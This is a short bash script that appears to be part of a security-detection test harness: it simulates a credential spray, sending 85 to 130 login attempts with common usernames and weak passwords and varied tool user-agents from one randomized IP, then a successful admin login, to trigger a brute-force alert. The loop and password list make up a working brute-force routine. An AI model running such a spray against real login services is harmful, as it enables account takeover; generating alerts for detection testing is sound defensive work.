#!/usr/bin/env bash
# Attack (rule 100120): a real credential spray — ~100 failed logins from one source in a
# short window. Attempt count, user-agent and the guessed username/password pairs all vary
# per run, so no two brute-force alerts look identical.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
ip="$(rand_attacker_ip)"
ua="$(pick 'python-requests/2.31' 'Python-urllib/3.11' curl/8.5.0 'Go-http-client/1.1')"
users=(admin administrator root sysadmin operator backup helpdesk svc-web jdoe sarah.mitchell
       james.okonkwo test guest oracle postgres www-data)
pws=(123456 password 123456789 qwerty 12345678 111111 1234567890 admin admin123 letmein
     root toor Passw0rd 'Passw0rd!' Summer2026 Winter2026 Welcome1 Welcome123 'P@ssw0rd' changeme
     iloveyou dragon monkey abc123 football princess sunshine 654321 superman qazwsx trustno1
     master hello whatever 'Spring2026!' bankofwonderland)
attempts="$(rint 85 130)"
echo "brute force from ${ip}: credential spray in progress (${attempts} attempts, UA=${ua})..."
for ((i=1; i<=attempts; i++)); do
  hit POST "/login" "$ip" "$ua" \
    --data-urlencode "username=$(pick "${users[@]}")" \
    --data-urlencode "password=$(pick "${pws[@]}")" >/dev/null 2>&1 || true
done
# The pivot: after the spray, one correct login from the SAME attacker IP (the compromise).
hit POST "/login" "$ip" "$ua" \
  --data-urlencode "username=admin" --data-urlencode "password=S0cAdmin!2026" >/dev/null 2>&1 || true
echo "  ${attempts} failed attempts then a SUCCESS as admin from ${ip}"
